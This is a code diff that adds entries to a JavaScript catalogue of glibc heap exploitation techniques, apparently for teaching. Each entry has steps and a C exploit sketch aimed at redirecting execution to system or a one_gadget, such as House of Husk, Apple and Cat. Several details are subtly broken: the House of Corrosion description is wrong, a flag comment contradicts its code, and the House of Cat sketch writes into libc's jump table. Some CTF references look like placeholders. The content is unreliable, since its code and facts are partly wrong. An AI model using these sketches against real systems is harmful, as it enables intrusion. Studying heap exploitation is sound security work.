@@ -687,6 +687,385 @@ void *target = malloc(0x100); // Gets target_address!`
     difficulty: 'Expert',
     patchedIn: ['2.29+'],
     relatedTechniques: ['fastbin-dup', 'unsorted-bin-attack']
+  },
+
+  first_fit: {
+    id: 'first-fit',
+    name: 'First Fit',
+    description: 'Demonstrates glibc malloc\'s first-fit behavior: freed chunks of the same size class are reused in LIFO order. Understanding this is fundamental to heap exploitation as it governs how malloc selects chunks.',
+    category: 'fastbin',
+    vulnerability: 'No vulnerability — this is a foundational understanding technique for heap behavior',
+    glibcVersions: ['All versions'],
+    prerequisites: [
+      'Understanding of glibc malloc internals',
+      'Ability to allocate and free chunks of same size'
+    ],
+    constraints: [
+      'Purely educational — no exploitation on its own',
+      'LIFO order only applies to fastbins and tcache, not unsorted bins'
+    ],
+    steps: [
+      '1. Allocate two chunks A and B of the same size.',
+      '2. Free chunk A.',
+      '3. Allocate chunk C of the same size — C will be placed where A was (LIFO).',
+      '4. This is the basis for UAF/double-free exploitation patterns.'
+    ],
+    exploitationPath: [
+      {
+        name: 'Reclaim Freed Chunk for UAF',
+        description: 'Demonstrate that malloc reuses the most recently freed chunk, enabling UAF type confusion',
+        code: `void *a = malloc(0x60);
+void *b = malloc(0x60);
+free(a);
+// malloc returns the same memory as 'a'
+void *c = malloc(0x60);
+// c == a (first-fit reuse)
+// Now we have c overlapping with old 'a' data`
+      }
+    ],
+    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/first_fit.c',
+    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/basics_of_heap.html',
+    ctfChallenges: [],
+    difficulty: 'Easy',
+    patchedIn: [],
+    relatedTechniques: ['fastbin-dup', 'tcache-poisoning']
+  },
+
+  poison_null_byte: {
+    id: 'poison-null-byte',
+    name: 'Poison Null Byte (Off-by-One Null)',
+    description: 'Off-by-one null byte overflow that clears the PREV_IN_USE bit and shrinks the prev_size of the next chunk, causing backward coalescing when that chunk is freed. Results in overlapping chunks.',
+    category: 'house',
+    vulnerability: 'Off-by-one null byte overflow into adjacent chunk metadata',
+    glibcVersions: ['2.14-2.32+'],
+    prerequisites: [
+      'Off-by-one null byte vulnerability (single null byte write)',
+      'Ability to allocate and free chunks to control layout',
+      'Understanding of PREV_IN_USE bit and coalescing'
+    ],
+    constraints: [
+      'Only a single null byte can be written',
+      'Must carefully construct chunk layout before triggering',
+      'Glibc 2.29+ adds stricter checks that complicate this technique'
+    ],
+    steps: [
+      '1. Allocate chunks A, B, C where A is target, B is overflow source, C is guard.',
+      '2. Overflow a null byte from B into C\'s size field, clearing PREV_IN_USE and setting prev_size.',
+      '3. Forge a fake chunk F inside B with exact prev_size matching the distance from F to C.',
+      '4. Free C — backward coalescing merges C all the way back to F, creating an overlapping chunk.',
+      '5. Allocate from the overlapping region to control chunk A\'s metadata.'
+    ],
+    exploitationPath: [
+      {
+        name: 'Overlapping Chunks via Null Byte',
+        description: 'Use off-by-one null to create overlapping chunks, then use UAF/tcache poisoning',
+        code: `// Allocate layout: fake_chunk | victim | attacker
+void *a = malloc(0x100);  // victim
+void *b = malloc(0x100);  // overflow source
+void *c = malloc(0x100);  // guard
+
+// Off-by-one: null byte overflow from b into c
+// This clears PREV_IN_USE in c, and sets c->prev_size
+*(char*)((uint64_t)c - 1) = '\\x00';
+
+// Forge fake prev_size in b so coalescing goes back to a
+// ...
+
+// Free c — backward coalescing to fake chunk
+free(c);
+// Now a and c overlap!`
+      }
+    ],
+    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/poison_null_byte.c',
+    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/heap_corruption.html',
+    ctfChallenges: [
+      { name: 'Plaid CTF 2015: pwnable200', year: '2015', link: 'https://ctftime.org' }
+    ],
+    difficulty: 'Hard',
+    patchedIn: ['2.29+'],
+    relatedTechniques: ['house-of-einherjar', 'overlapping-chunks']
+  },
+
+  overlapping_chunks_2: {
+    id: 'overlapping-chunks-2',
+    name: 'Overlapping Chunks 2 (Tcache Reclaim)',
+    description: 'Creates overlapping chunks by corrupting a freed chunk\'s metadata so that when it is reclaimed via malloc, the allocation overlaps with an adjacent existing chunk. A tcache variant of the classic overlapping chunks technique.',
+    category: 'tcache',
+    vulnerability: 'Heap overflow or UAF corrupting chunk size/metadata leading to overlapping allocations',
+    glibcVersions: ['2.26-2.32+'],
+    prerequisites: [
+      'Heap overflow to corrupt chunk size field',
+      'Understanding of tcache per-thread cache behavior',
+      'Ability to allocate/free chunks in controlled size classes'
+    ],
+    constraints: [
+      'tcache chunks have fewer checks than fastbins in older glibc versions',
+      'Only 7 chunks per tcache bin',
+      'Modern glibc (2.32+) safe-linking can complicate exploitation'
+    ],
+    steps: [
+      '1. Allocate chunks A, B, C where B\'s size can be overwritten.',
+      '2. Free B to tcache.',
+      '3. Overflow chunk A to increase B\'s size field (e.g., 0x80 → 0x100).',
+      '4. Allocate 0xf0 bytes — gets B\'s old slot but with larger size, now overlaps into C.',
+      '5. Now can read/write into C\'s data through the overlapping pointer.'
+    ],
+    exploitationPath: [
+      {
+        name: 'Tcache Overlap for Arbitrary Read/Write',
+        description: 'Resize a freed chunk in tcache to create overlapping allocation',
+        code: `void *a = malloc(0x70);
+void *b = malloc(0x70);
+void *c = malloc(0x70);
+
+free(b);  // b enters tcache[0x80]
+
+// Overflow from a: increase b's size to 0x100
+*(uint64_t*)(a + 0x78) = 0x101;  // b->size = 0x100
+
+// Allocate 0xf0 bytes — gets b with enlarged size
+void *overlap = malloc(0xf0);
+
+// overlap now covers c's memory too
+// *(uint64_t*)(overlap + 0x80) corrupts c->fd for tcache poisoning`
+      }
+    ],
+    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.29/overlapping_chunks_2.c',
+    dhavalkapilChapter: '',
+    ctfChallenges: [
+      { name: 'HITCON 2019: One Punch Man', year: '2019', link: 'https://ctftime.org' }
+    ],
+    difficulty: 'Medium',
+    patchedIn: [],
+    relatedTechniques: ['tcache-poisoning', 'fastbin-dup']
+  },
+
+  house_of_husk: {
+    id: 'house-of-husk',
+    name: 'House of Husk',
+    description: 'Corrupts the printf_function pointer table entry in libc to gain code execution. Leverages control over a freed chunk to overwrite the __printf_function_table or __printf_arginfo_table.',
+    category: 'house',
+    vulnerability: 'UAF or heap overflow allowing overwrite of libc internal function tables',
+    glibcVersions: ['2.23-2.31'],
+    prerequisites: [
+      'Heap overflow or UAF to corrupt chunk metadata',
+      'Libc address leak (essential for targeting printf function tables)',
+      'Binary uses printf family functions with format specifiers'
+    ],
+    constraints: [
+      'Requires libc leak',
+      'Format string must trigger the corrupted entry in printf_function_table',
+      'Glibc 2.32+ has safe-linking and other mitigations'
+    ],
+    steps: [
+      '1. Leak libc address via unsorted bin or format string.',
+      '2. Corrupt chunk so it overlaps with or points to __printf_function_table.',
+      '3. Write a valid pointer chain: __printf_function_table → arginfo_table → function_pointer.',
+      '4. Trigger printf() with a format specifier that hits the corrupted entry.',
+      '5. Execution redirects to attacker-controlled address.'
+    ],
+    exploitationPath: [
+      {
+        name: 'Printf Function Table Hijack',
+        description: 'Overwrite __printf_function_table to redirect execution via crafted printf format specifier',
+        code: `// Leak libc base
+uint64_t libc_base = leak_libc();
+
+// Corrupt chunk to write to __printf_function_table
+// In libc: __printf_function_table at known offset
+uint64_t printf_func_table = libc_base + OFFSET_PRINTF_FUNCTION_TABLE;
+uint64_t printf_arginfo_table = libc_base + OFFSET_PRINTF_ARGINFO_TABLE;
+
+// Write fake pointer chain
+*(uint64_t*)printf_func_table = arginfo_table_addr;
+// Set arginfo entry for a specific format char to one_gadget
+*(uint64_t*)(arginfo_table_addr + CHAR_OFFSET * 8) = one_gadget;
+
+// Trigger printf with format specifier matching char
+printf("%<char>");  // jumps to one_gadget!`
+      }
+    ],
+    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_husk.c',
+    dhavalkapilChapter: '',
+    ctfChallenges: [
+      { name: 'Balsn CTF 2020: Plain Text', year: '2020', link: 'https://ctftime.org' }
+    ],
+    difficulty: 'Expert',
+    patchedIn: ['2.32+'],
+    relatedTechniques: ['house-of-orange', 'fsop-exploit']
+  },
+
+  house_of_corrosion: {
+    id: 'house-of-corrosion',
+    name: 'House of Corrosion',
+    description: 'Exploits a heap overflow into the top chunk size field to shrink it, then uses that to corrupt various global variables (like __free_hook) by manipulating the distance between the top chunk and the target.',
+    category: 'top-chunk',
+    vulnerability: 'Heap overflow into top chunk to shrink its size, enabling heap-relative arbitrary writes',
+    glibcVersions: ['2.23-2.29'],
+    prerequisites: [
+      'Heap overflow into top chunk header',
+      'Ability to allocate many chunks (to exhaust manipulated top)',
+      'Knowledge of heap base address (partial write possible)'
+    ],
+    constraints: [
+      'Top chunk must be accessible via overflow',
+      'Target must be within modified top chunk range',
+      'Works best when __free_hook is still writable (pre-2.32)'
+    ],
+    steps: [
+      '1. Overflow into top chunk, set size to a small value (e.g., 0x1).',
+      '2. Allocate many chunks to exhaust the remaining (tiny) top chunk.',
+      '3. When top cannot service request, sysmalloc extends — top chunk now resets.',
+      '4. The distance between old heap and new extension can be predicted.',
+      '5. Use targeted allocations to write to known offsets like __free_hook.',
+      '6. Overwrite __free_hook with system or one_gadget.',
+      '7. Free a chunk containing "/bin/sh" to trigger.'
+    ],
+    exploitationPath: [
+      {
+        name: '__free_hook via Top Chunk Shrink',
+        description: 'Shrink top chunk to get arbitrary write to __free_hook',
+        code: `// Overflow into top chunk, shrink its size
+*(uint64_t*)(top_chunk + 8) = 0x1;  // top_chunk->size = 1
+
+// Now malloc fails to allocate from top, calls sysmalloc
+// Top chunk gets extended
+void *p1 = malloc(HUGE_SIZE);  // triggers sysmalloc extension
+
+// Distance to __free_hook is now calculable
+// Allocate specific size to land at __free_hook
+size_t distance = free_hook - new_top;
+void *p2 = malloc(distance);  
+void *p3 = malloc(0x10);  // p3 @ __free_hook
+
+*(uint64_t*)p3 = &system;  // overwrite __free_hook
+free("/bin/sh");             // system("/bin/sh")`
+      }
+    ],
+    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_corrosion.c',
+    dhavalkapilChapter: '',
+    ctfChallenges: [
+      { name: 'Corruption CTF 2021', year: '2021', link: '' }
+    ],
+    difficulty: 'Hard',
+    patchedIn: ['2.32+'],
+    relatedTechniques: ['house-of-force', 'tcache-poisoning']
+  },
+
+  house_of_apple: {
+    id: 'house-of-apple',
+    name: 'House of Apple',
+    description: 'FSOP-based technique that corrupts the _IO_FILE vtable pointer or wide-data pointers to redirect execution during IO dispatch (e.g., when exit() flushes stdout). Works on glibc 2.35+ even with vtable verification checks.',
+    category: 'house',
+    vulnerability: 'Controlled write to corrupt _IO_FILE structure (vtable or _wide_data) in libc or heap',
+    glibcVersions: ['2.35+'],
+    prerequisites: [
+      'UAF or heap overflow to corrupt _IO_FILE structure',
+      'Libc address leak (mandatory)',
+      'Ability to trigger IO operations (exit, puts, etc.)'
+    ],
+    constraints: [
+      'Requires a leak of libc base',
+      'Vtable verification in glibc 2.24+ restricts vtable hijack scope',
+      'Must redirect vtable into _IO_wfile_jumps area or use _wide_data technique'
+    ],
+    steps: [
+      '1. Leak libc base address.',
+      '2. Corrupt a _IO_FILE\'s _wide_data pointer to point to a controlled buffer.',
+      '3. Craft the wide data buffer to contain a vtable pointer.',
+      '4. Point vtable to _IO_wfile_jumps + offset to redirect _IO_wfile_overflow.',
+      '5. Trigger the IO flush (exit() or assert failure).',
+      '6. Execution redirects through the corrupted vtable to one_gadget or system.'
+    ],
+    exploitationPath: [
+      {
+        name: '_IO_wfile_overflow Hijack via Wide Data',
+        description: 'Corrupt _wide_data in _IO_FILE to redirect vtable dispatch through _IO_wfile_jumps',
+        code: `// Leak libc base
+uint64_t libc_base = leak_libc();
+
+// Forge wide_data on heap or in controlled memory
+struct _IO_FILE *fake = (struct _IO_FILE *)controlled_mem;
+// Set _wide_data to point to our crafted buffer
+fake->_wide_data = (struct _IO_wide_data *)wide_buf;
+
+// Craft wide_data with vtable pointing near _IO_wfile_jumps
+wide_buf->_wide_vtable = _IO_wfile_jumps + TARGET_OFFSET;
+
+// Set _IO_WRITE_FLAG and call _IO_wfile_overflow
+// When exit() is called, stdout flush triggers our vtable
+exit(0);  // triggers _IO_wfile_overflow → one_gadget`
+      }
+    ],
+    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_apple.c',
+    dhavalkapilChapter: '',
+    ctfChallenges: [
+      { name: 'HZHAG CTF 2022:_fmt', year: '2022', link: '' }
+    ],
+    difficulty: 'Expert',
+    patchedIn: [],
+    relatedTechniques: ['house-of-orange', 'fsop-exploit', 'house-of-cat']
+  },
+
+  house_of_cat: {
+    id: 'house-of-cat',
+    name: 'House of Cat',
+    description: 'Modern FSOP technique for glibc 2.35+ that corrupts _IO_wide_data to chain through _IO_wfile_jumps → _IO_wfile_overflow. Similar to House of Apple but with a different trigger path through the wide data vtable.',
+    category: 'house',
+    vulnerability: 'Controlled write to _IO_wide_data or vtable of _IO_FILE structures',
+    glibcVersions: ['2.35+'],
+    prerequisites: [
+      'UAF or controlled write to corrupt _IO_FILE structure',
+      'Libc address leak',
+      'Exit or assert path that flushes IO streams'
+    ],
+    constraints: [
+      'Requires libc leak',
+      'Must bypass vtable verification by staying within _IO_wfile_jumps',
+      'More complex chain than classic FSOP'
+    ],
+    steps: [
+      '1. Leak libc base address.',
+      '2. Find or create a controllable _IO_FILE structure (often via large bin attack + FSOP).',
+      '3. Set _wide_data pointer in the _IO_FILE to point to attacker-controlled memory.',
+      '4. In the wide_data buffer, set _wide_vtable to _IO_wfile_jumps.',
+      '5. Set flags to trigger _IO_wfile_overflow path.',
+      '6. Call exit() or trigger an IO flush.',
+      '7. _IO_wfile_overflow dispatches through corrupted wide vtable to one_gadget.'
+    ],
+    exploitationPath: [
+      {
+        name: '_IO_wfile_overflow Chain to RCE',
+        description: 'Use wide_data vtable hijack to bypass vtable checks and execute arbitrary function',
+        code: `// Forge _IO_FILE on heap
+uint64_t libc = leak_libc();
+uint64_t system = libc + SYSTEM_OFFSET;
+uint64_t wfile_jumps = libc + _IO_WFILE_JUMPS_OFFSET;
+
+// Corrupt _IO_FILE:
+// Set _flags to trigger wide char write path (0x800 | 0x1)
+// Set _wide_data to controlled heap addr
+file->_flags = 0x800 | 0x2;
+file->_wide_data = (void*)controlled_addr;
+
+// In controlled area, set _wide_vtable
+// _IO_wfile_overflow → goes through _wide_vtable
+controlled._wide_vtable = wfile_jumps + DELTA;
+
+// Set function pointer offset to one_gadget
+*(uint64_t*)(wfile_jumps + DELTA) = one_gadget;
+
+exit(0);  // flush triggers → _IO_wfile_overflow → one_gadget`
+      }
+    ],
+    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_cat.c',
+    dhavalkapilChapter: '',
+    ctfChallenges: [
+      { name: '2022 CTF Challenge', year: '2022', link: '' }
+    ],
+    difficulty: 'Expert',
+    patchedIn: [],
+    relatedTechniques: ['house-of-apple', 'house-of-orange', 'fsop-exploit']
   }
 };
 
